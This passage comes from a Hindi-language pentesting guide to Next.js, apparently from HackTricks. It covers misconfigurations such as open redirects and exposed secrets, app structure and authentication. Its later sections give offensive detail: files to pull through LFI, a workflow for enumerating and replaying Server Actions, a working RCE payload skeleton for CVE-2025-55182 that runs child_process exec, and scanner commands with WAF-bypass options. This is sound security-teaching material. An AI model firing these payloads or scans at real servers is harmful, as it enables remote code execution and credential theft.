- **`'*'`:** किसी भी बाहरी स्रोत से images लोड करने की अनुमति देता है, जिसमें अविश्वसनीय या malicious domains भी शामिल हैं। हमलावर ऐसी images होस्ट कर सकते हैं जिनमें malicious payloads या ऐसा कंटेंट हो जो उपयोगकर्ताओं को भ्रामक जानकारी दे।
- एक और समस्या यह हो सकती है कि किसी डोमेन को अनुमति देना **जहाँ कोई भी image अपलोड कर सकता है** (जैसे `raw.githubusercontent.com`)

**हमलावर इसका दुरुपयोग कैसे करते हैं:**

दुर्भावनापूर्ण स्रोतों से images inject करके, हमलावर phishing attacks कर सकते हैं, भ्रामक जानकारी दिखा सकते हैं, या image rendering libraries की vulnerabilities का exploit कर सकते हैं।

</details>

<details>

<summary>Environment Variables का एक्सपोज़र</summary>

API keys और database credentials जैसी संवेदनशील जानकारियाँ सुरक्षित तरीके से manage करें और इन्हें client को expose न करें।

#### a. संवेदनशील वेरिएबल्स का एक्सपोज़र

**खराब कॉन्फ़िगरेशन उदाहरण:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**समस्या:**

- **`SECRET_API_KEY`:** `NEXT_PUBLIC_` prefix के बिना, Next.js variables को client को expose नहीं करता। हालांकि, अगर गलती से prefix किया गया हो (जैसे `NEXT_PUBLIC_SECRET_API_KEY`), तो यह client side पर accessible हो जाता है।

**हमलावर इसका कैसे दुरुपयोग करते हैं:**

यदि संवेदनशील variables client को expose हो जाते हैं, तो हमलावर उन्हें client-side code या network requests की जाँच करके प्राप्त कर सकते हैं, और unauthorized access प्राप्त कर सकते हैं APIs, databases, या अन्य services का।

</details>

<details>

<summary>Redirects</summary>

अपने application में URL redirections और rewrites को संभालें, यह सुनिश्चित करते हुए कि users को उपयुक्त रूप से निर्देशित किया जाए बिना open redirect vulnerabilities पेश किए।

#### a. Open Redirect Vulnerability

**खराब कॉन्फ़िगरेशन उदाहरण:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**समस्या:**

- **Dynamic Destination:** उपयोगकर्ताओं को किसी भी URL को निर्दिष्ट करने की अनुमति देता है, जिससे open redirect attacks संभव होते हैं।
- **Trusting User Input:** उपयोगकर्ताओं द्वारा दिए गए URL बिना सत्यापन के redirect करने पर यह phishing, malware distribution, या credential theft का कारण बन सकता है।

**कैसे आक्रमणकारी इसका दुरुपयोग करते हैं:**

आक्रमणकारी ऐसे URLs बना सकते हैं जो आपके डोमेन से उत्पन्न होते दिखते हैं लेकिन उपयोगकर्ताओं को malicious sites पर redirect कर देते हैं। उदाहरण के लिए:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
मूल डोमेन पर भरोसा करने वाले उपयोगकर्ता अनजाने में हानिकारक वेबसाइटों पर जा सकते हैं।

</details>

<details>

<summary>Webpack कॉन्फ़िगरेशन</summary>

अपने Next.js एप्लिकेशन के लिए Webpack कॉन्फ़िगरेशन अनुकूलित करना, यदि सावधानी से न किया जाए तो अनजाने में सुरक्षा कमजोरियाँ पैदा कर सकता है।

#### a. संवेदनशील मॉड्यूल्स का खुलासा

**खराब कॉन्फ़िगरेशन उदाहरण:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**समस्या:**

- **संवेदनशील पथों का खुलासा:** Aliasing sensitive directories और client-side access की अनुमति देने से confidential information leak हो सकती है।
- **गोपनीय जानकारी का बंडल:** अगर sensitive फ़ाइलें client के लिए bundle की जाती हैं, तो उनका content source maps के माध्यम से या client-side code की जाँच करके accessible हो सकता है।

**हमलावर इसका दुरुपयोग कैसे करते हैं:**

हमलावर एप्लिकेशन की निर्देशिका संरचना को access या reconstruct कर सकते हैं, जिससे वे संभावित रूप से संवेदनशील फाइलें या डेटा खोजकर exploit कर सकते हैं।

</details>

### `pages/_app.js` और `pages/_document.js`

#### **`pages/_app.js`**

**उद्देश्य:** डिफ़ॉल्ट App component को ओवरराइड करना, जिससे global state, styles, और layout components की अनुमति मिलती है।

**उपयोग के मामले:**

- global CSS को inject करना।
- layout wrappers जोड़ना।
- state management libraries को integrate करना।

**उदाहरण:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**उद्देश्य:** डिफ़ॉल्ट Document को ओवरराइड करता है, जिससे <html> और <body> टैग्स को कस्टमाइज़ किया जा सके।

**उपयोग के मामले:**

- `<html>` या `<body>` टैग्स को संशोधित करना।
- meta टैग्स या कस्टम स्क्रिप्ट जोड़ना।
- थर्ड-पार्टी फ़ॉन्ट्स को इंटीग्रेट करना।

**उदाहरण:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### कस्टम सर्वर (वैकल्पिक)

**उद्देश्य:** हालाँकि Next.js एक बिल्ट-इन सर्वर के साथ आता है, आप कस्टम रूटिंग या मौजूदा बैकएंड सेवाओं के साथ एकीकृत करने जैसे उन्नत उपयोग मामलों के लिए एक कस्टम सर्वर बना सकते हैं।

**नोट:** कस्टम सर्वर का उपयोग deployment विकल्पों को सीमित कर सकता है, खासकर Vercel जैसे प्लेटफ़ॉर्म्स पर जो Next.js के बिल्ट-इन सर्वर के लिए ऑप्टिमाइज़ होते हैं।

**उदाहरण:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## अतिरिक्त आर्किटेक्चरल और सुरक्षा विचार

### पर्यावरण वेरिएबल्स और कॉन्फ़िगरेशन

**उद्देश्य:** सेंसिटिव जानकारी और कॉन्फ़िगरेशन सेटिंग्स को कोडबेस के बाहर प्रबंधित करना।

**सर्वोत्तम प्रथाएँ:**

- **Use `.env` Files:** `.env.local` जैसी फ़ाइलों में API keys जैसे वेरिएबल स्टोर करें (version control से बाहर रखा जाता है)।
- **Access Variables Securely:** environment variables को एक्सेस करने के लिए `process.env.VARIABLE_NAME` का उपयोग करें।
- **Never Expose Secrets on the Client:** सुनिश्चित करें कि संवेदनशील वेरिएबल्स केवल server-side पर उपयोग हों।

**उदाहरण:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**नोट:** वेरिएबल्स को केवल सर्वर-साइड तक सीमित करने के लिए, उन्हें `env` ऑब्जेक्ट से हटा दें या क्लाइंट एक्सपोज़र के लिए `NEXT_PUBLIC_` से प्रीफ़िक्स करें।

### LFI/download endpoints के माध्यम से लक्षित करने के लिए उपयोगी सर्वर आर्टिफैक्ट्स

अगर आप किसी Next.js ऐप में path traversal या download API पाते हैं, तो उन compiled artifacts को लक्षित करें जो server-side secrets और auth logic को leak करती हैं:

- `.env` / `.env.local` — session secrets और provider credentials के लिए।
- `.next/routes-manifest.json` और `.next/build-manifest.json` — पूरी route सूची के लिए।
- `.next/server/pages/api/auth/[...nextauth].js` — compiled NextAuth configuration पुनर्प्राप्त करने के लिए (अक्सर fallback passwords होते हैं जब `process.env` मान सेट नहीं होते)।
- `next.config.js` / `next.config.mjs` — rewrites, redirects और middleware routing की समीक्षा करने के लिए।

### प्रमाणीकरण और प्राधिकरण

**दृष्टिकोण:**

- **सेशन-आधारित प्रमाणीकरण:** User sessions को manage करने के लिए cookies का उपयोग करें।
- **टोकन-आधारित प्रमाणीकरण:** Stateless authentication के लिए JWTs लागू करें।
- **थर्ड-पार्टी प्रोवाइडर्स:** `next-auth` जैसे लाइब्रेरीज़ का उपयोग कर OAuth प्रोवाइडर्स (जैसे Google, GitHub) के साथ इंटीग्रेट करें।

**सुरक्षा अभ्यास:**

- **Secure Cookies:** `HttpOnly`, `Secure`, और `SameSite` attributes सेट करें।
- **Password Hashing:** पासवर्ड को स्टोर करने से पहले हमेशा hash करें।
- **इनपुट वैलिडेशन:** इनपुट्स को validate और sanitize करके injection attacks से बचें।

**उदाहरण:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### प्रदर्शन अनुकूलन

**रणनीतियाँ:**

- **छवि अनुकूलन:** Next.js के `next/image` component का उपयोग स्वचालित छवि अनुकूलन के लिए करें।
- **कोड विभाजन:** डायनेमिक imports का उपयोग करके कोड को विभाजित करें और प्रारंभिक लोड समय कम करें।
- **कैशिंग:** API responses और static assets के लिए कैशिंग रणनीतियाँ लागू करें।
- **लेज़ी लोडिंग:** Components या assets को केवल तभी लोड करें जब उनकी आवश्यकता हो।

**उदाहरण:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

आधुनिक Next.js “Server Actions” का उपयोग करता है जो सर्वर पर execute होते हैं लेकिन क्लाइंट से invoke किए जाते हैं। प्रोडक्शन में ये invocations opaque होते हैं: सभी POSTs एक सामान्य endpoint पर पहुँचते हैं और build-specific hash के आधार पर अलग किए जाते हैं जो `Next-Action` header में भेजा जाता है। उदाहरण:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
When `productionBrowserSourceMaps` सक्रिय होता है, minified JS chunks में `createServerReference(...)` कॉल्स होते हैं जो पर्याप्त संरचना (plus associated source maps) leak करते हैं, जिससे action hash और मूल function name के बीच mapping recover की जा सकती है। इससे आप `Next-Action` में देखे गए hashes को `deleteUserAccount()` या `exportFinancialData()` जैसे concrete targets में translate कर सकते हैं।

### Extraction approach (regex on minified JS + optional source maps)

डाउनलोड किए गए JS chunks में `createServerReference` खोजें और hash और function/source symbol निकालें। दो उपयोगी पैटर्न:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Group 1: server action hash (40+ hex chars)
- Group 2: symbol or path that can be resolved to the original function via the source map when present

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### व्यावहारिक कार्यप्रवाह

- ब्राउज़ करते समय passive discovery: `Next-Action` headers और JS chunk URLs वाले requests को capture करें।
- संदर्भित JS bundles और साथ के `*.map` files को fetch करें (जब मौजूद हों)।
- ऊपर दिया गया regex चलाकर एक hash↔name dictionary बनाएं।
- परीक्षण लक्ष्य करने के लिए dictionary का उपयोग करें:
- Name-driven triage (उदा., `transferFunds`, `exportFinancialData`)।
- function name के आधार पर builds में coverage track करें (hashes builds के साथ rotate करते हैं)।

### छिपी हुई actions का प्रयोग (template-based request)

in-proxy में देखे गए एक valid POST को template के रूप में लें और `Next-Action` value को बदलकर किसी अन्य मिले हुए action को target करें:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Repeater में replay करें और अन्यथा अप्राप्य actions की authorization, input validation और business logic का परीक्षण करें।

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) ऊपर बताई प्रक्रिया को Burp में स्वचालित करता है:
- प्रॉक्सी इतिहास में JS chunks खोजता है, `createServerReference(...)` एंट्रियाँ निकालता है, और उपलब्ध होने पर source maps को पार्स करता है।
- एक खोजने योग्य hash↔function-name शब्दकोश बनाए रखता है और function name के आधार पर builds में डुप्लीकेट हटाता है।
- एक वैध template POST ढूंढ सकता है और target action के hash को स्वैप करके एक ready-to-send Repeater tab खोल सकता है।
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Requires `productionBrowserSourceMaps` enabled in production to recover names from bundles/source maps.
- Function-name disclosure स्वयं में vulnerability नहीं है; इसका उपयोग खोज का मार्गदर्शन करने और प्रत्येक action की authorization का परीक्षण करने के लिए करें।

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments जो `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** पर Server Actions expose करते हैं, उनके Flight chunk deserialization के दौरान एक गंभीर server-side prototype pollution मौजूद है। `$` references को Flight payload के अंदर बनाकर, attacker polluted prototypes से arbitrary JavaScript execution तक और फिर Node.js process के अंदर OS command execution तक pivot कर सकता है।

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Attack chain in Flight chunks

1. **Prototype pollution primitive:** Set `"then": "$1:__proto__:then"` ताकि resolver `Object.prototype` पर एक `then` function लिख दे। इसके बाद प्रोसेस होने वाला कोई भी plain object एक thenable बन जाता है, जिससे attacker RSC internals के अंदर async control flow को प्रभावित कर सकता है।
2. **Rebinding to the global `Function` constructor:** `_response._formData.get` को `"$1:constructor:constructor"` की ओर इंगित करें। resolution के दौरान, `object.constructor` → `Object`, और `Object.constructor` → `Function`, इसलिए भविष्य में `_formData.get()` के कॉल वास्तव में `Function(...)` को execute करते हैं।
3. **Code execution via `_prefix`:** JavaScript source को `_response._prefix` में रखें। जब polluted `_formData.get` invoke होता है, framework `Function(_prefix)(...)` evaluate करता है, इसलिए injected JS `require('child_process').exec()` या कोई अन्य Node primitive चला सकता है।

#### Payload skeleton
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### React Server Function एक्सपोजर का मैपिंग

React Server Functions (RSF) वे फ़ंक्शंस हैं जिनमें `'use server';` निर्देश शामिल होता है। उन फ़ंक्शंस में बाइंड किए गए किसी भी form action, mutation, या fetch helper का हर एक RSC Flight endpoint बन जाता है, जो attacker-supplied payloads को खुशी-खुशी deserialize कर लेता है। React2Shell assessments से निकले उपयोगी recon कदम:

- **Static inventory:** निर्देश खोजें ताकि समझ सकें कि framework द्वारा कितने RSFs स्वचालित रूप से expose किए जा रहे हैं।
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` डिफ़ॉल्ट रूप से App Router + `app/` डायरेक्टरी सक्षम करता है, जो चुपचाप हर route को RSC-सक्षम endpoint में बदल देता है। App Router assets כגון `/_next/static/chunks/app/` या वे responses जो Flight chunks को `text/x-component` पर stream करते हैं, मजबूत इंटरनेट-फेसिंग fingerprints हैं।
- **Implicitly vulnerable RSC deployments:** React की advisory बताती है कि RSC runtime शिप करने वाली apps exploitable हो सकती हैं **भले ही explicit RSFs न हों**, इसलिए किसी भी build को जो `react-server-dom-*` 19.0.0–19.2.0 उपयोग करता है, संदिग्ध मानें।
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, आदि वही serializer का पुन: उपयोग करते हैं और वही remote attack surface विरासत में लेते हैं जब तक कि वे patched React builds embed न कर लें।

#### संस्करण कवरेज (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **vulnerable** in 19.0.0, 19.1.0–19.1.1 and 19.2.0; **patched** in 19.0.1, 19.1.2 and 19.2.1 respectively.
- **Next.js stable:** App Router releases 15.0.0–16.0.6 vulnerable RSC stack embed करते हैं। Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 में fixed deps शामिल हैं, इसलिए उन versions से नीचे कोई भी build high-value माना जाता है।
- **Next.js canary:** `14.3.0-canary.77+` भी buggy runtime शिप करता है और फिलहाल patched canary drops नहीं हैं, जिससे ये fingerprints strong exploitation candidates बनते हैं।

#### रिमोट डिटेक्शन ओरेकल

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) एक crafted multipart Flight request candidate paths पर भेजकर server-side व्यवहार मॉनिटर करता है:

- **Default mode** एक deterministic RCE payload execute करता है (math operation जो `X-Action-Redirect` के माध्यम से reflected होता है) और code execution साबित करता है।
- **`--safe-check` mode** जानबूझकर Flight message को malformed करता है ताकि patched servers `200/400` लौटाएँ, जबकि vulnerable targets `HTTP/500` responses भेजते हैं जिनके body में `E{"digest"` substring होता है। वह `(500 + digest)` pair फिलहाल defenders द्वारा प्रकाशित सबसे reliable remote oracle है।
- Built-in `--waf-bypass`, `--vercel-waf-bypass`, and `--windows` switches payload layout समायोजित करते हैं, junk prepend करते हैं, या OS commands swap करते हैं ताकि आप वास्तविक Internet assets probe कर सकें।
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
## संदर्भ

- [Pentesting Next.js Server Actions — Hash-to-Function Mapping के लिए एक Burp एक्सटेंशन](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp एक्सटेंशन)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – जानने के लिए सब कुछ](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)

{{#include ../../banners/hacktricks-training.md}}
